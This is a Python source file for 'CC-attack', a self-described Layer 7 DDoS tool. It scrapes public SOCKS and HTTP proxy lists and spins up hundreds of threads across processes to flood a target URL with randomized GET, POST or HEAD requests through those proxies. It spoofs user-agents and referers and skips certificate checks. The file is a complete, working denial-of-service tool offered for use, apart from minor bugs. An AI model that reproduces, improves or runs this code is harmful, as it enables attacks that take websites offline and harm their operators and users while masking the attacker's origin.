# CC-attack rewrite preview version
# Coded by Leeon123
#############################
# Import built-in libraries #
#############################
import threading
import multiprocessing
import random
import ssl
import sys
import string
import socket
import os
import time
import requests

try:
	import socks
except:
	print("Please install pysocks from pip.")
	exit(-1)

#############################
#         variables         #
#############################
global_vars = {#Share it in multiprocessing, and set default values
	"Method":"get",
	"Target_Url":"",
	"Proxy_type":5,# 0 for http, 4 for socks4, 5 for socks5
	"Thread_num":400,
	"Process_num":1,
	"Payload":"",
	"Cookies":"",
	"Cookies_file":"",
	"RandUrl":False,
	"Path":"/",

	#untouchable stuff
	"Proxies_list":[],
	"Protocol": "",
	"Target":"",
	"Port":0,
	"ascii_letters":string.ascii_letters,
	"digits":string.digits,

	"acceptall": [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",],

	"referers" : [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
],
	"Proxytype_mapping" : {
		5: socks.SOCKS5,
		4: socks.SOCKS4,
		0: socks.HTTP,
}

	}

#################################
#          Misc stuff          #
#################################

def PrintLogo():
	print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version Preview
.                             C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+]     Rewrote                    │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘''')


def getuseragent():
	platform = random.choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = random.choice(['Linux i686', 'Linux x86_64'])
	browser = random.choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(random.randint(500, 599))
		version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = int(time.strftime("%Y"))
		year = str(random.randint(2020, currentYear))
		month = random.randint(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = random.randint(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(random.randint(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(random.randint(1, 99)) + '.0'
		engine = str(random.randint(1, 99)) + '.0'
		option = random.choice([True, False])
		if option == True:
			token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def RandomString(vars):
	pattern = random.randint(0,3)
	if pattern == 0:
		return generate_random_string("s"*10+"d"*10+"S"*10,vars)
	if pattern == 1:
		return generate_random_string("S"*5+"s"*5+"S"*5+"d"*15,vars)
	if pattern == 2:
		return generate_random_string("d"*5+"s"*10+"S"*10+"d"*5,vars)
	if pattern == 3:
		return generate_random_string("d"*20+"s"*5+"S"*5,vars)



def generate_random_string(pattern,vars):
	# Generate a random string of the specified pattern
	random_string = ""
	for ch in pattern:
		if ch == "s":
			# Generate a random lowercase letter
			random_string += random.choice(vars["ascii_letters"][:26])
		elif ch == "S":
			# Generate a random uppercase letter
			random_string += random.choice(vars["ascii_letters"][26:])
		elif ch == "d":
			# Generate a random digit
			random_string += random.choice(string.digits)
		else:
			# Use the character as-is
			random_string += ch
	return random_string

def build_threads(vars,events):
	# Create a thread to run the HTTP flood function
	for _ in range(vars["Thread_num"]):
		threading.Thread(target=CC_ATTACK, args=(vars,events,)).start()

def build_processes(vars,events):
	if vars["Process_num"] < 1:
		print("Invaild Process numbers.(At least 1 process)")
	for _ in range(vars["Process_num"]):
		multiprocessing.Process(target=build_threads, args=(vars,events,),daemon=True).start()

def check_list(proxy_file):
	print("> Checking list")
	seen = set()
	with open(proxy_file, "r") as f:
		for line in f:
			if ':' in line and '#' not in line:
				try:
					socket.inet_pton(socket.AF_INET, line.strip().split(":")[0])
					if line not in seen:
						seen.add(line)
				except:
					pass
	with open(proxy_file,"w") as f:
		for line in seen:
			f.write(line)
		

def PreGenRequest(vars):
	request =  vars["Method"].upper() + " " + vars["Path"] + "{url_arg}  HTTP/1.1\r\n"
	request += "Host: "+vars["Target"]+":"+str(vars["Port"])+"\r\n"
	request += "User-Agent: " + getuseragent() + "\r\n"
	if vars["Cookies"] != "":
		request += "Cookies: "+vars["Cookies"]+"\r\n"
	request += random.choice(vars["acceptall"])
	request += "Connection: Keep-Alive\r\n"
	request += "Cache-Control: no-cache\r\n"
	request += "Upgrade-Insecure-Requests: 1\r\n"
	if vars["Method"] != "post":
		request += "Referer: "+random.choice(vars["referers"])+vars["Target"]+"\r\n"
		request+= "\r\n"
	else:
		request += "Referer: "+vars["Protocol"]+"://"+vars["Target"]+"\r\n"
		request += "Content-Type: text/html; charset=utf-8\r\n"
		request += "Content-Legnth: {payload_len}\r\n"
		request += "\r\n{payload}"
	
	return request

def PrintHelp():
	print('''===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/method | set HTTP Method
   -data     | set post data path (only works on post method)
			 | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:400)
   -f        | set proxies file (default:proxy.txt)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================''')

def download_proxies(vars, out_file):
	proxy_type = vars["Proxy_type"]
	api_list = set()
	if proxy_type == 4:
		api_list = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",]
	elif proxy_type == 5:
		api_list = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",]
	elif proxy_type == 0:
		api_list = ["https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			"https://www.proxy-list.download/api/v1/get?type=https"]

	with open(out_file, "wb") as f:
		for api in api_list:
			try:
				r = requests.get(api, timeout=5)
				f.write(r.content)
			except ConnectionError:
				# Retry request after a short delay
				time.sleep(0.5)
				r = requests.get(api, timeout=5)
				f.write(r.content)
	if proxy_type == 4:
		socks_proxy_net(out_file)
	print("> Have already downloaded proxies list as "+out_file)

def socks_proxy_net(out_file):
	try:
		r = requests.get("https://www.socks-proxy.net/",timeout=5)
		part = str(r.content)
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
			fd = open(out_file,"a")
			fd.write(proxies)
			fd.close()
	except:
		pass

#################################
#           CC-ATTACK           #
#################################
def CC_ATTACK(vars,event):
	# Split the proxy string into host and port
	proxy = random.choice(vars["Proxies_list"]).strip().split(":")

	# Generate the request
	request = PreGenRequest(vars)
	path_parts = vars["Path"].partition("?")
	add = "&" if path_parts[1] else "?"
	if (vars["RandUrl"])==True:
		request = request.format(url_arg=add+"{url_arg}")
	else:
		request = request.format(url_arg="")

	# Wait signal
	event.wait()
	# Keep sending requests until interrupted
	while True:
		try:
			# Create a socket and set the proxy and timeout
			s = socks.socksocket()
			s.set_proxy(vars["Proxytype_mapping"][vars["Proxy_type"]], str(proxy[0]), int(proxy[1]))
			s.settimeout(3)

			# Connect to the target
			s.connect((vars["Target"], vars["Port"]))

			# If using HTTPS, wrap the socket in an SSL context
			if vars["Protocol"] == "https":
				ctx = ssl.create_default_context()
				ctx.check_hostname = False
				ctx.verify_Method = ssl.CERT_NONE
				s = ctx.wrap_socket(s)

			# Send 100 requests
			for _ in range(100):
				# Use a random URL if specified
				if vars["RandUrl"]:
					request = request.format(url_arg=RandomString(vars))

				# Use a random payload if specified
				if vars["Method"] == "post":
					if vars["Payload"] != "":
						request = request.format(payload=vars["Payload"],payload_len=len(vars["Payload"]))
					else:
						data = RandomString(vars)
						request = request.format(payload=data,payload_len=len(data))

				# Send the request
				s.send(str.encode(request))

			# Close the socket
			s.close()
		except:
			proxy = random.choice(vars["Proxies_list"]).strip().split(":")
			# Ignore any errors and keep sending requests
			pass

#################################
#      Process Input stuff      #     
#################################

def InputOption(question, options, default):
	# Ask the user for an input until a valid response is given
	while True:
		# Get the user's response and strip leading/trailing white space
		ans = input(question).strip().lower()

		# If the user didn't enter a response, use the default value
		if not ans:
			ans = default

		# If the user's response is in the list of valid options, return it
		if ans in options:
			return ans

		# Otherwise, print an error message and loop again
		print("> Please enter the correct option")


def ParseUrl(original_url,vars):
	# Strip leading/trailing white space from the original URL
	original_url = original_url.strip()

	# Parse the protocol (default to "http")
	protocol = "http"
	if original_url.startswith("https://"):
		protocol = "https"

	# Split the URL into target, port, and path
	url = original_url.split("://")[1]
	target, *port_and_path = url.split("/")
	port = port_and_path[0].split(":")[1] if len(port_and_path) != 0 and ":" in port_and_path[0] else 443 if protocol == "https" else 80
	path = "/" + "/".join(port_and_path) if port_and_path else "/"

	# set the parsed components of the URL
	vars["Protocol"] = protocol
	vars["Target"] = target
	vars["Port"] =  port
	vars["Path"] = path


#################################
#         Input stuff          #
#################################
'''haven't done
def oldcli(vars):
	print("> Method: [get/post/head]")#/slow/check]") #haven't finished
	vars["Method"] = InputOption("> Choose Your Method (default=get) :",["get","post","head"],"get")#,"slow","check"],"cc")
	url = str(input("> Input the target url:")).strip()
	ParseUrl(url,vars)
	if vars["Method"] == "post":
		if InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n") == "y":
			data = open(input("> Input the file's path:").strip()).readlines()
			vars["Payload"] = ' '.join([str(txt) for txt in data])
	if InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n") == "y":
		vars["Cookies"] = str(input("Plese input the cookies:")).strip()
	choice = InputOption("> Choose your socks Method(4/5, default=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	#if vars["Method"] == "check":
		#CheckerOption()
		#print("> End of process")
		#return
	#if vars["Method"] == "slow":	
	#	vars["Thread_num"] = int(input("> Connections(default=400):"))
	#else:
		vars["Thread_num"] = int(input("> Threads(default=400):"))
	#CheckerOption()
	ind_rlock = threading.RLock()
	if Method == "slow":
		input("Press Enter to continue.")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		event = threading.Event()
		print("> Building threads...")
		SetupIndDict()
		build_threads(Method,thread_num,event,socks_type,ind_rlock)
		event.clear()
		input("Press Enter to continue.")
		event.set()
	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
	while True:
		try:
			time.sleep(0.1)
		except KeyboardInterrupt:
			break
'''
def main():
	#Initial those "global" varibles
	vars = global_vars
	help = False
	download = False
	durations = 60
	proxy_file = "proxy.txt"
	for n,args in enumerate(sys.argv):
		#if args == "-oldcli":
			#oldcli(vars)
		if args == "-help" or args =="-h":
			help =True
		if args=="-url":
			ParseUrl(sys.argv[n+1],vars)
		if args=="-m" or args=="-method":
			vars["Method"] = sys.argv[n+1]
			if vars["Method"] not in ["get","post","head"]:#,"slow"]:
				print("> -m/-method argument error")
				return
		if args =="-v":
			ver= sys.argv[n+1]
			if ver == "4":
				vars["Proxy_type"] = 4
			elif ver == "5":
				vars["Proxy_type"] = 5
			elif ver == "http":
				vars["Proxy_type"] = 0
			elif ver not in ["4","5","http"]:
				print("> -v argument error (only 4/5/http)")
				return
		if args == "-tt":
			try:
				vars["Thread_num"] = int(sys.argv[n+1])
			except:
				print("> -tt must be integer")
				return
		if args == "-tp":
			try:
				vars["Process_num"] = int(sys.argv[n+1])
			except:
				print("> -tp must be integer")
				return
		if args == "-cookies":
			vars["Cookies"] = sys.argv[n+1]
		if args == "-data":
			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
			vars["Payload"] = ' '.join([str(txt) for txt in data])
		if args == "-f":
			proxy_file = sys.argv[n+1]
		if args == "-rand":
			vars["RandUrl"] = True
		if args == "-down":
			download=True
		'''
		if args == "-check":
			check_proxies = True'''
		if args == "-s":
			try:
				durations = int(sys.argv[n+1])
			except:
				print("> -s must be integer")
				return
	#print("> Method: [get/post/head]")#slow]")
	if download:
		download_proxies(vars,proxy_file)
	if os.path.exists(proxy_file)!=True:
		print("Proxies file not found")
		return
	vars["Proxies_list"] = open(proxy_file).readlines()	
	check_list(proxy_file)
	vars["Proxies_list"] = open(proxy_file).readlines()	
	if vars["Proxies_list"] == 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return
	print ("> Number Of Proxies: %d" %(len(vars["Proxies_list"])))
	#if check_proxies:
		#check_socks(5)

	#vars["Proxies_list"] = open(proxy_file).readlines()
	
	if help:
		PrintHelp()

	if vars["Target"] == "":
		print("> There is no target. End of process ")
		return
	'''
	if Method == "slow":
		th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
		th.daemon = True
		th.start()
	else:'''
	event = multiprocessing.Event()
	print("> Building Process...")
	build_processes(vars,event)
	event.clear()
	#input("Press Enter to continue.")
	event.set()
	print("> Flooding...")
	time.sleep(durations)

if __name__ == '__main__':
	PrintLogo()
	main()
